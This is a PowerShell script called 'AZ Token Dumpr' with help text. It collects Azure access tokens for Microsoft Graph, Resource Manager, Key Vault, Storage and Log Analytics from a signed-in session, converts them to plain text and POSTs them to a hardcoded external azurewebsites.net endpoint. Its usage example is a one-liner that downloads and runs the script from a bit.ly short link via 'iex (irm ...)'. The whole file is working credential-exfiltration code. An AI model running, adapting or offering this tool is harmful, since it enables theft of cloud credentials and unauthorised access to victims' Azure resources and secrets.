<#
.SYNOPSIS
Retrieves access tokens for Azure resources and sends to a specified endpoint.

.DESCRIPTION
The AccessToken function retrieves access tokens for a predefined set of Azure resource types. 
It requires the Az.Accounts module and an active Azure session. The function collects the tokens 
and sends them to a specified endpoint via an HTTP POST request.

.PARAMETER None
This function does not take any parameters.

.EXAMPLE
PS> iex (irm bit.ly/blct-fetch)
This example downloads and runs the AccessToken function, retrieves access tokens for the specified Azure resources, 
and sends them to the configured endpoint.

.NOTES
- Ensure the Az.Accounts module is installed and you are signed in to your Azure account using Connect-AzAccount.
- The function uses parallel processing to retrieve tokens for multiple resource types concurrently.
- The tokens are sent to an endpoint specified in the function.

#>
function AccessToken {
    [cmdletbinding()]
    param (
        [string]$passphrase = "AzTokenDumpr"
    )

    if (-not(Get-Module -Name 'Az.Accounts')) {
        Write-Output "The Az.Accounts module is required to run this function. Please install the module and try again."
        exit
    }

    if (-not(Get-AzContext)) {
        Write-Output "Please sign in to your Azure account using Connect-AzAccount before running this function."
        exit
    }

    $resourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "OperationalInsights")

    $null = Set-AzConfig -DisplayBreakingChangeWarning $false
    Clear-Host

    try {
        $tokens = [System.Collections.Concurrent.ConcurrentBag[PSCustomObject]]::new()

        $logo = @"
  ______      __              ____
 /_  __/___  / /_____  ____  / __ \__  ______ __  ____  _____
  / / / __ \/ //_/ _ \/ __ \/ / / / / / / __ `__ \/ __ \/ ___/
 / / / /_/ / ,< /  __/ / / / /_/ / /_/ / / / / / / /_/ / /
/_/  \____/_/|_|\___/_/ /_/_____/\__,_/_/ /_/ /_/ .___/_/
                                               /_/

             --- AZ Token Dumpr v1.2.4 ---
"@

        Write-Host $logo

        $resourceTypeNames | ForEach-Object -Parallel {
            $tokens = $using:tokens
            try {
                $accessToken = (Get-AzAccessToken -ResourceTypeName $_ -AsSecureString -ErrorAction SilentlyContinue)
                if ($accessToken) {
                    $tokenObject = [PSCustomObject]@{
                        Resource = $_
                        Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
                    }
                    $tokens.Add($tokenObject)
                }
            }
            catch {
                Write-Error "Failed to get access token for resource type $_ : $($_.Exception.Message)"
            }
        }

        $requestParam = @{
            Uri         = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?'
            Method      = 'POST'
            ContentType = 'application/json'
            Body        = @{
                action       = "create"
                secret_value = $tokens | ConvertTo-Json -Depth 10
                passphrase   = $passphrase
            } | ConvertTo-Json -Depth 10
        }

        $response = Invoke-RestMethod @requestParam
        return @{
            secretName = $response.secretName
            url        = "bit.ly/blct-fetch"
        }
    }
    catch {
        Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
    }
}

AccessToken